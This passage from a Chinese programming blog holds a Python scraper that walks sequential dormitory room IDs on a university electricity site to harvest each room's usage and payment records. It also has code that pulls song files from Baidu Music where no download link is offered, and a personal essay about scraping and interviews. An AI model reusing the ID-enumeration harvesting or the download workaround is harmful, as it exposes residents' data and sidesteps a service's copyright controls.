class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">用电信息</span><br><span class="line">http://ydcx.bupt.edu.cn/Default.aspx</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">"Reverland"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml.html <span class="keyword">import</span> fromstring</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">30</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_info</span><span class="params">(dorm_num, root)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">'buy info downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = root.xpath(<span class="string">'//table[@id="GridView2"]/tr/td/font/text()'</span>)</span><br><span class="line">    <span class="comment"># header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp, electric_increase, money, charge_bool, state, operator\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="comment"># timestamp, electric_increase, money, charge_bool, state, operator</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">' downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">' now...'</span></span><br><span class="line">    data = []</span><br><span class="line">    r = requests.get(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num)</span><br><span class="line">    <span class="comment">## parse the content</span></span><br><span class="line">    root = fromstring(r.content)</span><br><span class="line">    <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">    __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">    __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## __EVENTTARGET is fixed</span></span><br><span class="line">    __EVENTTARGET = <span class="string">'GridView1'</span></span><br><span class="line">    buy_info(dorm_num, root)</span><br><span class="line">    <span class="comment">## define headers</span></span><br><span class="line">    header = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;</span><br><span class="line">    np = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># First extract some value</span></span><br><span class="line">        <span class="comment"># print "Retrieving data from page", np</span></span><br><span class="line">        __EVENTARGUMENT = <span class="string">'Page$'</span> + str(np)</span><br><span class="line">        payload = &#123;</span><br><span class="line">        <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">        <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">        <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">        r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">        <span class="comment">## get electric data</span></span><br><span class="line">        data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">        <span class="comment">## get current page numbers</span></span><br><span class="line">        cpn = re.findall(<span class="string">'\)"&gt;&lt;font color="#4A3C8C"&gt;([\d]+)'</span>, r.content)</span><br><span class="line">        <span class="keyword">if</span> (int(cpn[-<span class="number">1</span>]) == np - <span class="number">1</span>) <span class="keyword">or</span> (int(cpn[-<span class="number">1</span>]) % <span class="number">10</span> != <span class="number">0</span>):</span><br><span class="line">            cpn = range(np+<span class="number">1</span>, int(cpn[-<span class="number">1</span>]) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment">## next page</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">                <span class="comment">## parse the content</span></span><br><span class="line">                root = fromstring(r.content)</span><br><span class="line">                <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">                __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">                __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                __EVENTARGUMENT = <span class="string">'Page$'</span>+ str(p)</span><br><span class="line">                payload = &#123;</span><br><span class="line">                <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">                <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">                <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">                <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">                r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">                data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">                <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">## next page</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">            <span class="comment">## parse the content</span></span><br><span class="line">            root = fromstring(r.content)</span><br><span class="line">            <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">            __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">            __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            __EVENTARGUMENT = <span class="string">'Page$'</span> + p</span><br><span class="line">            payload = &#123;</span><br><span class="line">            <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">            <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">            <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">            <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">            r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">            data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">            <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">        <span class="comment"># check if reach end</span></span><br><span class="line">        np = int(cpn[-<span class="number">1</span>]) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># write header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp'</span> + <span class="string">','</span> + <span class="string">'electric_remain\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment">## for example</span></span><br><span class="line">    <span class="comment"># __EVENTVALIDATION = '/wEWCwKhncT7DwKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1vYI/vd4i5UCVuVYMSo/l30x1o/g='</span></span><br><span class="line">    <span class="comment"># __EVENTARGUMENT = 'Page$2'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#data = parse_dorm_elec(dorm_num)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec_wrap</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parse_dorm_elec(dorm_num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">" error..."</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------</span></span><br><span class="line"><span class="comment"># # dorm 10</span></span><br><span class="line"><span class="comment"># dorms = []</span></span><br><span class="line"><span class="comment"># # layer 1</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-1' + str(x).zfill(2), range(1, 17))</span></span><br><span class="line"><span class="comment"># # layer 2</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-2' + str(x).zfill(2), range(1, 21))</span></span><br><span class="line"><span class="comment"># # layer 3 to 7</span></span><br><span class="line"><span class="comment"># for l in range(3, 8):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2), range(1, 72))</span></span><br><span class="line"><span class="comment"># # layer 8 to 13</span></span><br><span class="line"><span class="comment"># for l in range(8, 14):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2) , range(1, 53))</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"><span class="comment"># dorm 1</span></span><br><span class="line">dorms = []</span><br><span class="line"><span class="comment"># layer 1</span></span><br><span class="line">dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(<span class="number">1</span>) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">24</span>))</span><br><span class="line"><span class="comment"># layer 2,5</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">    dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(l) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">27</span>))</span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for d in dorms:</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             print "Error with ", d</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">5</span>)</span><br><span class="line">pool.join(timeout=timeout)</span><br><span class="line">pool.map(parse_dorm_elec_wrap, dorms)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print dorms</span></span><br><span class="line"><span class="comment"># parse_dorm_elec('10-1220')</span></span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/02/baidu-music/" itemprop="url">
                  Python Spider: 爬取百度音乐
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-02T00:00:00+08:00" content="2015-04-02">
              2015-04-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/02/baidu-music/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/02/baidu-music/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Take_a_sad_song,_and_make_it_better：爬取百度音乐">Take a sad song, and make it better：爬取百度音乐</h2><p>以下，个人的一个trial and error的过程，仅供参考。</p>
<p>用到一些基本知识比如HTTP请求啊，html啊，json啊，ajax啊，当然，不懂也没关系……<br>使用了一些工具比如firefox啊，firebug啊，python啊……当然你们喜欢用chrome/chromium还是IE都一样……</p>
<p>也许是我听的歌太小众了，经常会发现有些歌在线听的好好的，竟然没有下载链接</p>
<p><img src="/images/spider/baidu_music.png" alt="" title="baidu音乐">]</p>
<p>对此，很不理解，在线可以听到就说明浏览器已经把媒体文件下载下来并且播放出来了……为啥会告诉我没有下载链接？</p>
<p>某天，听到Beatles的Hey Jude，我忽然觉得得动手找找音乐文件是哪里的。于是，打开firebug，选择network标签下的media标签，可是什么也没有。</p>
<p><img src="/images/spider/baidumusic.png" alt=""></p>
<p>唉？于是又确认了下，百度音乐在线播放器不是flash，满满的html5标签= =</p>
<p>凭借直觉，应该和xmlhttprequest有关系，于是抱着试试看的心理打开firebug上的xhr标签</p>
<p><img src="/images/spider/baidumusic1.png" alt=""></p>
<p>哇，果然有好多请求，咦？songlink？凭借直觉似乎是音乐链接地址……</p>
<p>打开返回的json看了看果然有个来自file.qianqian.com的疑似歌曲链接(有时候用firebug的搜索功能也不失为良策)……</p>
<p><img src="/images/spider/baidumusic3.png" alt=""></p>
<p>把引号中的链接复制粘帖到地址栏，哇，果然是歌曲mp3啊</p>
<p><img src="/images/spider/baidumusic4.png" alt=""></p>
<p>我们可以再认真看看返回的json，其中有lrc歌词链接，有封面图片链接、歌曲文件大小啊等等</p>
<p>接下来的问题是，如果想下载其它歌曲怎么办。首先观察之前我们获取想要mp3链接的POST请求。</p>
<p><img src="/images/spider/baidumusic2.png" alt=""></p>
<p>请求参数中有一个songID？似乎很清晰的样子，我猜吧，每个歌曲在百度音乐库中都对应这么一个ID</p>
<p>后来发现确实差不多。</p>
<p>至此，可以开始写自己的爬虫了……</p>
<p>关键部分大致这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_by_song_id_list</span><span class="params">(song_id_list)</span>:</span></span><br><span class="line">    song_data = <span class="string">'songIds='</span> + <span class="string">"%2C"</span>.join(song_id_list)</span><br><span class="line">    song_link_url = <span class="string">"http://play.baidu.com/data/music/songlink"</span></span><br><span class="line">    headers = &#123;<span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">               <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded;\</span><br><span class="line">               charset=UTF-8"</span>&#125;</span><br><span class="line">    r = requests.post(song_link_url, data=song_data, headers=headers)</span><br><span class="line">    data = json.loads(r.content)</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> data[<span class="string">'data'</span>][<span class="string">'songList'</span>]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + it[<span class="string">'songName'</span>], <span class="string">': '</span>, it[<span class="string">'size'</span>], <span class="string">"bytes"</span></span><br><span class="line">        <span class="comment"># print it['songLink']</span></span><br><span class="line">        r_song = requests.get(it[<span class="string">'songLink'</span>], stream=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">with</span> open(it[<span class="string">'songName'</span>] + <span class="string">'.'</span> + it[<span class="string">'format'</span>], <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            dl = <span class="number">0</span></span><br><span class="line">            total_length = int(it[<span class="string">'size'</span>])</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> r_song.iter_content():</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> b:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                dl += len(b)</span><br><span class="line">                f.write(b)</span><br><span class="line">                done = int(<span class="number">50</span> * dl / total_length)</span><br><span class="line">                sys.stdout.write(<span class="string">"\r[%s%s] %.2f%%"</span></span><br><span class="line">                                 % (<span class="string">'='</span> * done, <span class="string">' '</span></span><br><span class="line">                                    * (<span class="number">50</span> - done), <span class="number">100.0</span> * dl / total_length))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'\n'</span> + it[<span class="string">'songName'</span>] + <span class="string">'.'</span> + it[<span class="string">'format'</span>], <span class="string">" finished"</span></span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/01/python-spider-quick-and-dirty-way/" itemprop="url">
                  Python Spider: a Quick and Dirty Aproach
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-01T00:00:00+08:00" content="2015-04-01">
              2015-04-01
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/01/python-spider-quick-and-dirty-way/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/01/python-spider-quick-and-dirty-way/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>面试的时候，面试官问我这些年瞎折腾有什么主线，我说有，但又不想说我他妈的其实想做的是发现数据中的知识，我要构建用户和产品的桥梁，让设计师的梦想照进现实。更不好露出自己的獠牙恶狠狠地说，而不是你们扯jb淡的安全。想了想，还是说了些不着边际的东西。这违背的初心和四处的张望自然没有逃过面试官一双柔和但不失犀利而充满智慧双瞳，我感受到那友善的目光，知道这安全的面试到头了。</p>
<p>想要分析数据，首先要有数据。得益于互联网蝗虫般铺天盖地的扩张，数据渐渐不再是问题。专业的数据科学家会从某些高质量的数据仓库下载供他们玩弄各种理论算法和工具的数据，我是野路子，从一开始，就开始自己去爬取数据，清理数据，当然，最后依然在这个脏活累活的阶段，比那些张口深度学习闭口大数据的数据科学家低到不知道哪里去了。</p>
<p>写爬虫是个很意外的开始，好奇人人上好友之间的关系，认真学习的第一门语言是R，因为上课挺老师说sas太贵了，上课是因为数学建模，数学建模是因为被同学晃进去了，总之，我从来没觉得命运是掌握在自己手中的，或者积极点，很高兴人生是充满意外和惊喜的。</p>
<p>总之，精通R语言的陈某某在统计之都上发了个R做聚类的什么文章，其中的某张图意外的击中了我哪根不对头的神经，不知不觉酝酿了多年后，就成了现在这个鬼样子。</p>
<p>后来做安全，听到那些高深莫测的高人们一致同意渗透的第一步和最重要的一步就是信息搜集。为了表示自己是属于高人哪一类的，我举起了四只脚表示同意。于是就开始各种写爬虫搜集信息，从某个站点所有的文档中的元信息到返回信息等等，但我从不做坏事，我只下载公开信息，显然安全专家们觉得我这点非常low，谈及此事，它们不屑一顾，而是不断的问我有什么光环，挖出过什么漏洞。我自然没有，终于也只是在第一个层级上不断搜集信息。</p>
<p>有段时间做爬虫，团队有个愿景是把全宇宙的网站都爬下来，这当然不是我们的愿景，但这只能是我们的愿景。我们开着2M联通小水管，开始phantomjs刷刷刷，搜集互联网上来路不明的代理，不断切换刷刷刷，最后做了些什么我也不知道。投资人显然对此不甚满意，我们太low了，没有做到什么百万并发千万集群，也没有统治宇宙。但投资人眼里某些公司做到了，然后，没钱就没有然后了。</p>
<p>于是，我依然很low，数据科学家看不上、爬虫专家们看不上、安全专家们看不上、做底层和硬件的觉得我朽木难雕。总之，它们好像心有灵犀似的，都相互默契的微微一笑，对我说出了那句熟悉的台词：你是个好人，但我们不合适。我想了很久，却觉得话里透露着其它意思，好像夜里狮子的心，狼子的肺似的总让人觉得不对劲，夜里翻来覆去无数遍，重放了多次之前的场景，之前的只言片语终于串联起来，都明明白白指着一个意思：你哪方面都很渣啊。</p>
<p>这让我感到惶恐，又有些些许无奈，我觉得那些面试官们都是好人，也佩服和仰慕他们在领域内的修为。他们谆谆教导我可以去看看这些那些，耐心地对我进行指引。我的理智非常感激它们，身体却无比诚实。那时，在身边刷题算法的大潮涌动下，我立下誓言，我他妈的要刷算法去谷歌，然后打开leetcode看了两行，就知道谷歌比我不知道高到哪里去了。我这种算法结构一窍不通，编译链接通通报错的渣渣就开始做把杭州某巨大集团招聘信息转换成组织架构这种于人于己都无关紧要吃力不讨好的事。如果你看过王小波的某本书，你会知道这是个减熵的过程。这绝对违背自然规律，也违背我想要为社会做贡献，让公司赚大钱，让世界更美好的崇高理想。</p>
<p>总之，我的理想已经碎了。</p>
<p>多年前，我看到个人计算机的发明者去做牙医，妇科圣手玩转安全、乔布斯不好好学习学习字体理论等等不务正业的故事都深受鼓舞，现在忽然就发现这其实是世界的险恶用心，不，应该是世界的温柔。</p>
<p>在大学的某个时候走上的歪路，是时候终结了。我想过成为一名心理医生、一名律师、一名原画师，一名设计师、一名光学工程师、一个前端工程师、一个数据挖掘工程师、一个误人子弟的老师、一个做或不做技术的销售，一个满嘴跑火车产品经理、一个天马星空运营专员，一个文笔自由的诗人、一个想唱就唱的行吟歌手<br>……现在，该醒醒了。照照镜子，看看镜子中狼狈不堪的那只，凄厉地汪两声感觉下现实冰冷的空气。</p>
<p>这才发现跑题跑得好远，思维跳跃和宽广这种属性在某个工业社会里一定不是什么好事，因为成为一个产线上可以替换的零件比成为一个人重要的多。但是，现在这个世界身在何处，又要往哪里去呢？</p>
<p>总之，这篇文章是回顾下哪些年写过的渣爬虫，而不是扯淡。我喜欢这种感觉要完蛋了他妈的结果又回光返照的奇葩经历。你们听过燕姿的天嘿嘿么，每当到某个地方时，我都觉得这首歌唱完了，结果她又来了一句。</p>
<p>就是这样。</p>
<p>所以，又多说一句。某个不错地方的技术面问了这么个问题，你对加班怎么看，你能不能抗住巨大的工作压力。我不知道这个问题的初心是啥，总之觉得又不是新部门或者创业公司，该部门的管理很差劲效率极低，同时不把员工当人看。又一个朋友去了一家小小的创业公司，虽然每天晚上最早十点多才回，却私下跟我说氛围比较轻松其实挺开心的，这是某个一到下班恨不得每个人都逃离的某某地方望尘莫及的。所以怎么看，把个人动力和公司利益结合起来是我等随时可替换的渣渣工人毕生人生追求，我自觉在这条卖身的道路上卖的还不够不可持续发展，需要更加努力的提升自己的思想道德水平。当然，冠冕堂皇的说辞还是抄袭左耳朵耗子老师比较稳妥。</p>
<p>祝上文提到的创业公司发展壮大，该团队还有我很崇拜的大神呢ლ(╹◡╹ლ)</p>
<p>以下是正文，我之前发在byr论坛上，现在搬到一起，向过去告别：</p>
<hr>
<p>你用python做什么？</p>
<p>很严肃的东西：比如项目、工作、比如blablabla</p>
<p>你学一门语言为了干什么？</p>
<p>因为好奇、因为想提高自己、因为blablabla</p>
<p>然而一门语言真正能干什么？</p>
<p>复杂的东西离我们太远，我们不用构建一个成千上万用户级的大型网站、不用计算火箭轨道、不用尝试穷举破解密码系统，不用在云端与大数据共舞，在集群中并行。那些听上去离我们很远。</p>
<p>简单的东西太不堪入目。打印出钻石型的字符串、编写一个能读取我们输入的C程序、计算一个字符串的长度，做小学应用题……</p>
<p>一门语言应该这样、即使没有深厚的数据结构和算法基础，你依然知道可以用它来真正的做到你想要做的事情。同时不用过分陷入底层的细节和种种优化问题。</p>
<p>我觉得python一定程度上做到了这点，真的是一门属于每个人的计算机语言。无论他/她是什么背景。</p>
<p>Let’s Rock With Python now.</p>
<p>For fun and profit.</p>
<ul>
<li>工欲善其事，必先利其器</li>
